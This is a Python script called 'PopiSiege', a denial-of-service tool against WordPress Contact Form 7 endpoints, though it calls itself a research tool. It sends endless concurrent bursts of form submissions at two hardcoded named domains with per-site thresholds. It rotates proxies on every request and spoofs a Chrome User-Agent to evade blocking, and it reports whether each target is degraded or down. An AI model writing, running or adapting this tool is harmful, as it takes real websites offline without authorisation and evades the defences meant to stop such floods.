#!/usr/bin/env python3
"""
PopiSiege VPS Edition
CF7 Worker Exhaustion Research Tool
Runs continuously until Ctrl+C
Proxy rotation per request — browser User-Agent
Auto-refreshes proxy pool when alive drops below 50%

Usage:
  python3 popisiege.py
  python3 popisiege.py --target metoo-buffalo.com
  python3 popisiege.py --target metoo-shatkin.com --concurrency 30
  python3 popisiege.py --help
"""

import requests, time, sys, argparse
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from proxy_pool import ProxyPool

G = "\033[0;32m"; R = "\033[0;31m"; Y = "\033[0;33m"
C = "\033[0;36m"; W = "\033[0m";    B = "\033[1m"

BROWSER_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/124.0.0.0 Safari/537.36"
)

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
PROXY_FILE = os.path.join(SCRIPT_DIR, "proxies.txt")

# ── known targets ──────────────────────────────────────────────────────────
TARGETS = {
    "metoo-shatkin.com": {
        "url":       "https://metoo-shatkin.com/wp-json/contact-form-7/v1/contact-forms/50/feedback",
        "form_id":   "50",
        "unit_tag":  "wpcf7-f50-p30-o1",
        "threshold": 19,
    },
    "metoo-buffalo.com": {
        "url":       "https://metoo-buffalo.com/wp-json/contact-form-7/v1/contact-forms/248/feedback",
        "form_id":   "248",
        "unit_tag":  "wpcf7-f248-p850-o1",
        "threshold": 25,
    },
}


# ─────────────────────────────────────────────────────────────────────────────
#  PAYLOAD
# ─────────────────────────────────────────────────────────────────────────────

def build_files(form_id, unit_tag):
    return {
        "_wpcf7":          (None, form_id),
        "_wpcf7_version":  (None, "6.1.6"),
        "_wpcf7_locale":   (None, "en_US"),
        "_wpcf7_unit_tag": (None, unit_tag),
        "your-name":       (None, "Test User"),
        "your-email":      (None, "test@test.com"),
        "your-subject":    (None, "Test"),
        "your-message":    (None, "Hello"),
    }


# ─────────────────────────────────────────────────────────────────────────────
#  SINGLE REQUEST
# ─────────────────────────────────────────────────────────────────────────────

def send_one(req_num, cfg, pool):
    proxy = pool.next()
    if not proxy:
        return req_num, 0, 0, "N/A", "none", "all proxies dead"

    s = requests.Session()
    s.proxies = {"http": proxy, "https": proxy}
    s.headers.update({"User-Agent": BROWSER_UA})

    t0 = time.time()
    try:
        r       = s.post(cfg["url"], files=build_files(cfg["form_id"], cfg["unit_tag"]), timeout=25)
        elapsed = time.time() - t0
        cache   = r.headers.get("cf-cache-status", "N/A")
        return req_num, r.status_code, elapsed, cache, proxy, None
    except Exception as e:
        elapsed = time.time() - t0
        pool.mark_dead(proxy)
        return req_num, 0, elapsed, "N/A", proxy, str(e)[:40]


# ─────────────────────────────────────────────────────────────────────────────
#  BURST — fire N concurrent requests
# ─────────────────────────────────────────────────────────────────────────────

def burst(concurrency, cfg, pool, verbose):
    ok = []; err = []; times = []
    with ThreadPoolExecutor(max_workers=concurrency) as ex:
        futures = [ex.submit(send_one, i, cfg, pool) for i in range(1, concurrency+1)]
        for f in as_completed(futures):
            num, code, elapsed, cache, proxy, error = f.result()
            short = proxy.replace("http://","").replace("https://","")[:22]
            if code == 200:
                ok.append(code); times.append(elapsed)
            else:
                err.append(code)
            if verbose:
                sym    = G+"[✓]"+W if code==200 else R+"[✗]"+W
                detail = f"HTTP={code or 'ERR':<3} | Time={elapsed:.2f}s | Cache={cache}"
                if error: detail += f" | {error}"
                print(f"    {sym} Req {num:>3} | {short:<22} | {detail}")
    return ok, err, times


# ─────────────────────────────────────────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────────────────────────────────────────

def main():
    p = argparse.ArgumentParser(
        description="PopiSiege VPS — CF7 worker exhaustion research tool",
        formatter_class=argparse.RawTextHelpFormatter
    )
    p.add_argument("--target",      default="metoo-shatkin.com",
                   help=f"Target domain (default: metoo-shatkin.com)\nAvailable: {', '.join(TARGETS)}")
    p.add_argument("--concurrency", type=int, default=None,
                   help="Concurrent requests per burst (default: auto from known threshold)")
    p.add_argument("--proxy-file",  default=PROXY_FILE,
                   help=f"Path to proxy list file (default: {PROXY_FILE})")
    p.add_argument("--verbose",     action="store_true",
                   help="Show every request")
    p.add_argument("--delay",       type=float, default=0,
                   help="Seconds between bursts (default: 0)")
    args = p.parse_args()

    # ── resolve target ─────────────────────────────────────────────────────
    domain = args.target.replace("https://","").replace("http://","").strip("/")
    if domain not in TARGETS:
        print(f"\n  {R}[ERROR]{W} Unknown target: {domain}")
        print(f"  Known: {', '.join(TARGETS)}\n")
        sys.exit(1)

    cfg         = TARGETS[domain]
    concurrency = args.concurrency or cfg["threshold"]

    # ── load proxies ───────────────────────────────────────────────────────
    try:
        pool = ProxyPool(args.proxy_file)
    except FileNotFoundError:
        print(f"\n  {R}[ERROR]{W} Proxy file not found: {args.proxy_file}")
        print(f"  Run: python3 proxy_tester.py\n")
        sys.exit(1)

    print(f"""
{B}{'='*66}{W}
  PopiSiege VPS — CF7 Worker Exhaustion
{B}{'='*66}{W}
  Target      : {cfg['url']}
  Form ID     : {cfg['form_id']}
  Unit Tag    : {cfg['unit_tag']}
  Concurrency : {concurrency} per burst  (threshold = {cfg['threshold']})
  Proxies     : {pool.alive()} alive — rotating per request
  Auto-refresh: ON — triggers when alive drops below 50%
  User-Agent  : Chrome/124 (browser)
  Mode        : Continuous until Ctrl+C
{B}{'='*66}{W}
""")

    total_ok  = 0
    total_err = 0
    burst_num = 0
    all_times = []
    start     = time.time()

    try:
        while True:
            burst_num += 1
            ts = datetime.now().strftime("%H:%M:%S")

            if not args.verbose:
                print(f"  {C}[Burst {burst_num:>4}]{W} {ts} | "
                      f"alive={pool.alive()}/{len(pool.proxies)} | "
                      f"sending {concurrency}...",
                      end="", flush=True)

            ok, err, times = burst(concurrency, cfg, pool, args.verbose)

            total_ok  += len(ok)
            total_err += len(err)
            all_times += times

            avail  = len(ok) / concurrency * 100
            avg_t  = sum(times)/len(times) if times else 0
            run_t  = time.time() - start

            if avail >= 80:   status = G+"STABLE"+W
            elif avail >= 30: status = Y+"DEGRADED"+W
            else:             status = R+"DOWN"+W

            if not args.verbose:
                print(f"\r  {C}[Burst {burst_num:>4}]{W} {ts} | "
                      f"OK={len(ok)}/{concurrency} | "
                      f"Avail={avail:>5.1f}% | "
                      f"Avg={avg_t:.2f}s | "
                      f"alive={pool.alive()}/{len(pool.proxies)} | "
                      f"Status={status} | "
                      f"Runtime={run_t:.0f}s")
            else:
                print(f"\n  {C}[Burst {burst_num}]{W} OK={len(ok)}/{concurrency} | "
                      f"Avail={avail:.1f}% | Avg={avg_t:.2f}s | "
                      f"alive={pool.alive()}/{len(pool.proxies)} | {status}\n")

            # auto-refresh when alive drops below 50%
            pool.maybe_refresh()

            if args.delay > 0:
                time.sleep(args.delay)

    except KeyboardInterrupt:
        print(f"\n\n  {Y}[STOPPED]{W} Ctrl+C received.\n")

    # ── final report ───────────────────────────────────────────────────────
    runtime = time.time() - start
    total   = total_ok + total_err

    print(f"{B}{'='*66}{W}")
    print(f"  FINAL REPORT")
    print(f"{B}{'='*66}{W}")
    print(f"  Target        : {cfg['url']}")
    print(f"  Runtime       : {runtime:.0f}s")
    print(f"  Bursts fired  : {burst_num}")
    print(f"  Total requests: {total}")
    print(f"  200 OK        : {total_ok}  ({total_ok/total*100:.1f}%)" if total else "  No data")
    print(f"  Errors        : {total_err}  ({total_err/total*100:.1f}%)" if total else "")
    if all_times:
        print(f"  Avg resp time : {sum(all_times)/len(all_times):.2f}s")
        print(f"  Max resp time : {max(all_times):.2f}s")
    print(f"  Proxies dead  : {len(pool._dead)}/{len(pool.proxies)}")
    print(f"  RPS           : {total/runtime:.2f}" if runtime > 0 else "")
    print(f"{B}{'='*66}{W}\n")


if __name__ == "__main__":
    main()
